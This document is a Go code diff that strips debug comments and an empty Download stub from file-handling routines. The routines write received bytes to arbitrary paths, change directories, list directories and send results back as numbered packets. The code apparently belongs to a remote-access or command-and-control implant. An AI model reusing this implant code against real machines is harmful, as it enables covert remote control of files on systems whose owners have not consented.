@@ -102,22 +102,18 @@ func ParseCommandUpload(b []byte) ([]byte, []byte) {
 func Upload(filePath string, fileContent []byte) int {
 	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
 	if err != nil {
-		//fmt.Printf("file create err : %v\n", err)
 		return 0
 	}
 	defer fp.Close()
 	offset, err := fp.Write(fileContent)
 	if err != nil {
-		//fmt.Printf("file write err : %v\n", err)
 		return 0
 	}
-	//fmt.Printf("the offset is %d\n",offset)
 	return offset
 }
 func ChangeCurrentDir(path []byte) {
 	err := os.Chdir(string(path))
 	if err != nil {
-		//processError(err.Error())
 		processErrorTest(err.Error())
 	}
 }
@@ -133,7 +129,6 @@ func GetCurrentDirectory() []byte {
 
 func File_Browse(b []byte) []byte {
 	buf := bytes.NewBuffer(b)
-	//resultStr := ""
 	pendingRequest := make([]byte, 4)
 	dirPathLenBytes := make([]byte, 4)
 
@@ -193,7 +188,6 @@ func File_Browse(b []byte) []byte {
 	} else {
 		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
 	}
-	//resultStr := fmt.Sprintf("%s/*", absCurrentDir)
 	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
 	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
 	files, err := ioutil.ReadDir(dirPathStr)
@@ -206,7 +200,6 @@ func File_Browse(b []byte) []byte {
 			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
 		}
 	}
-	//fmt.Println(resultStr)
 	return utilities.BytesCombine(pendingRequest, []byte(resultStr))
 }
 
@@ -218,8 +211,4 @@ func processErrorTest(err string) {
 	result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
 	finalPacket := transports.MakePacket(31, result)
 	transports.PushResult(finalPacket)
-}
-
-func Download() {
-
 }
